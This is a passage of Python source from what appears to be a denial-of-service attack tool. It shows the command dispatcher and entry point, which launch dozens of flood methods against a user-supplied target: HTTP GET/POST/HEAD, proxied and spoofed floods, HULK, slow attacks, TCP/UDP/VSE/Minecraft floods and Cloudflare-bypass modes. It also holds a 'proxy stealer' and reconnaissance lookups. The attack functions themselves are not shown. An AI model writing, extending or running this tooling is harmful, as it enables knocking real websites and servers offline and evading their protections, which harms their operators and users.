        target, thread, t = get_info_l7()
        
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchPPS(target, thread, t)
        timer.join()
    elif "spoof" in cmdl or 'SPOOF' in cmdl:
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchSPOOF(target, thread, t)
        timer.join()
    elif "pxspoof" in cmdl or "PXSPOOF" in cmdl:
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchPXSPOOF(target, thread, t, get_proxylist("SOCKS5"))
        timer.join()
        time.sleep(1000)
    elif 'get' in cmdl or 'GET' in cmdl:
        target, thread, t = get_info_l7()
        threading.Thread(target=AttackRAW, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif 'post' in cmdl or 'POST' in cmdl:
        target, thread, t = get_info_l7()
        threading.Thread(target=AttackPOST, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif 'head' in cmdl or 'HEAD' in cmdl:
        target, thread, t = get_info_l7()
        threading.Thread(target=AttackHEAD, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()

    elif 'tcpcustom' in cmdl:
        target, port, thread, t = get_info_l4()
        tcpcustom(target, port, thread, t)

    elif 'pxraw' in cmdl or 'PXRAW' in cmdl:
        target, thread, t = get_info_l7()
        if get_proxies():
            threading.Thread(target=AttackPXRAW, args=(target, t, thread)).start()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            timer.join()
    elif 'soc' in cmdl or 'SOC' in cmdl:
        target, thread, t = get_info_l7()
        threading.Thread(target=AttackSOC, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif 'pxsoc' in cmdl or 'PXSOC' in cmdl:
        target, thread, t = get_info_l7()
        if get_proxies():
            threading.Thread(target=AttackPXSOC, args=(target, t, thread)).start()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            timer.join()
    elif 'cfreq' in cmdl or 'CFREQ' in cmdl:
        target, thread, t = get_info_l7()
        stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + "Bypassing CF... (Max 60s)\n")
        if get_cookie(target):
            threading.Thread(target=AttackCFPRO, args=(target, t, thread)).start()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            timer.join()
        else:
            stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + "Failed to bypass cf\n")
    elif 'cfsoc' in cmdl or 'CFSOC' in cmdl:
        target, thread, t = get_info_l7()
        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
        if get_cookie(target):
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchCFSOC(target, thread, t)
            timer.join()
        else:
            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
    elif 'lionddos' in cmdl or 'LIONDDOS' in cmdl:
        if get_proxies():
            target, thread, t = get_info_l7()
            threading.Thread(target=attacklionred, args=(target, t, thread)).start()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            timer.join()
    elif 'lionred' in cmdl or 'lionred' in cmdl:
        target, thread, t = get_info_l7()
        threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    #####################################################################################
    elif 'udp' in cmdl or 'UDP' in cmdl:
        target, port, thread, t = get_info_l4()
        threading.Thread(target=runsender, args=(target, port, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif 'tcp' in cmdl or 'TCP' in cmdl:
        target, port, thread, t = get_info_l4()
        threading.Thread(target=runflooder, args=(target, port, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif 'mine' in cmdl or 'MINE' in cmdl:
        target, port, thread, t = get_info_l4()
        threading.Thread(target=runmine, args=(target, port, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif 'vse' in cmdl or 'VSE' in cmdl:
        target, port, thread, t = get_info_l4()
        threading.Thread(target=runvse, args=(target, port, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif 'hulk' in cmdl or 'HULK' in cmdl:
        target, thread, t = get_info_l7()
        threading.Thread(target=AttackHULK, args=(target,thread, t)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        
        timer.join()    

    elif 'cfpro' in cmdl or 'CFPRO' in cmdl:
        target, thread, t = get_info_l7()
        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
        if get_cookie(target):
            threading.Thread(target=AttackCFPRO, args=(target, t, thread)).start()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            timer.join()
        else:
            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")    
    elif 'bypass' in cmdl or 'BYPASS' in cmdl:
        target, thread, t = get_info_l7()
        threading.Thread(target=attackbypass, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif 'pxslow' in cmdl or 'PXSLOW' in cmdl:
        target, thread, t = get_info_l7()
        if get_proxies():
            threading.Thread(target=attackslow, args=(target, t, thread)).start()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            timer.join()
    elif 'stellar' in cmdl or 'STELLAR' in cmdl:
        target, thread, t = get_info_l7()
        threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    
    ##################################################################################
    elif '.proxy' in cmdl or '.PROXY' in cmdl:
        try:
            qtime = int(input("Timeout proxy [seconds] (0 - all): "))
            if qtime == 0:
                qtime = None
        except:
            print(Fore.RED+"\nIncorrect timeout proxy\n")
            exit()
        req = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http")
        array = req.text.split()
        open("proxy.txt", "w+").close()
        for prox in array:
            thread_list = []
            t = threading.Thread (target=check, args=(ip, prox, qtime))
            thread_list.append(t)
            t.start()

    elif 'subnet' in cmdl:
        stdout.write(Fore.MAGENTA + " [>] " + Fore.WHITE + "IP " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/subnetcalc/?q={target}")
            print(r.text)
        except:
            print('An error has occurred while sending the request to the API!')

    elif 'dns' in cmdl:
        stdout.write(Fore.MAGENTA + " [>] " + Fore.WHITE + "IP/DOMAIN " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/reversedns/?q={target}")
            print(r.text)
        except:
            print('An error has occurred while sending the request to the API!')

    elif 'geoip' in cmdl:
        stdout.write(Fore.MAGENTA + " [>] " + Fore.WHITE + "IP " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/geoip/?q={target}")
            print(r.text)
        except:
            print('An error has occurred while sending the request to the API!')
    elif '.proxies' in cmdl:
      try:
          stdout.write(Fore.MAGENTA + " [>] " + Fore.WHITE + ' PROXY STEALER STARTED...' + "\n")
          for site in proxy_resources:
              res = steal_proxies(site)
              if res:
                  stdout.write(Fore.MAGENTA + " [>] " + Fore.GREEN + " SUCCESSFUL " + Fore.WHITE + site + "\n")
              else:
                  stdout.write(Fore.MAGENTA + " [>] " + Fore.RED + ' UNSUCCESSFUL ' + Fore.WHITE + site + '\n')
      except Exception as Error:
          stdout.write(
                Fore.MAGENTA + " [>] " + Fore.MAGENTA + ".proxies command Error " + Fore.RED + f" [{Error}] " + '\n')   
    else:
        print((Colorate.Horizontal(Colors.red_to_purple, ' [!] Command not found.')))
    ######################################################################################


# If not launched in an input
if __name__ == '__main__':
    init(convert=True)
    if len(sys.argv) < 2:
        ua = open('./resources/ua.txt', 'r').read().split('\n')
        clr()
        welcome()
    elif len(sys.argv) == 5:
        pass
    else:
        stdout.write(
            "Method: cfb, pxcfb, cfreq, cfsoc, lionddos, lionred, get, post, head, soc, pxraw, pxsoc\n")
        stdout.write(f"usage:~# python3 {sys.argv[0]} <method> <target> <thread> <time>\n")
        sys.exit()
    ua = open('./resources/ua.txt', 'r').read().split('\n')
    method = sys.argv[1].rstrip()
    target = sys.argv[2].rstrip()
    thread = sys.argv[3].rstrip()
    t = sys.argv[4].rstrip()
    if method == "cfb":
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchCFB(target, thread, t)
        timer.join()
    elif method == "pxcfb":
        if get_proxies():
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXCFB(target, thread, t)
            timer.join()
    elif method == "get":
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchRAW(target, thread, t)
        timer.join()
    elif method == "post":
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchPOST(target, thread, t)
        timer.join()
    elif method == "head":
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchHEAD(target, thread, t)
        timer.join()
    elif method == "pxraw":
        if get_proxies():
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXRAW(target, thread, t)
            timer.join()
    elif method == "soc":
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchSOC(target, thread, t)
        timer.join()

    elif method == "pxsoc":
        if get_proxies():
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXSOC(target, thread, t)
            timer.join()
    elif method == "cfreq":
        stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + "Bypassing CF... (Max 60s)\n")
        if get_cookie(target):
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchCFPRO(target, thread, t)
            timer.join()
        else:
            stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + "Failed to bypass cf\n")
    elif method == "cfsoc":
        stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + "Bypassing CF... (Max 60s)\n")
        if get_cookie(target):
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchCFSOC(target, thread, t)
            timer.join()
        else:
            stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + "Failed to bypass cf\n")
    elif method == "http2":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchHTTP2(target, thread, t)
        timer.join()
    elif method == "pxhttp2":
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXHTTP2(target, thread, t)
            timer.join()
    elif method == "lionddos":
        if get_proxies():
            target, thread, t = get_info_l7()
            threading.Thread(target=attackLIONRED, args=(target, t, thread)).start()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            timer.join()
    elif method == "lionred":
        target, thread, t = get_info_l7()
        threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    else:
        stdout.write(
            "No method found.\nMethod: cfb, pxcfb, cfreq, cfsoc, lionddos, lionred,  get, post, head, soc, pxraw, pxsoc\n")
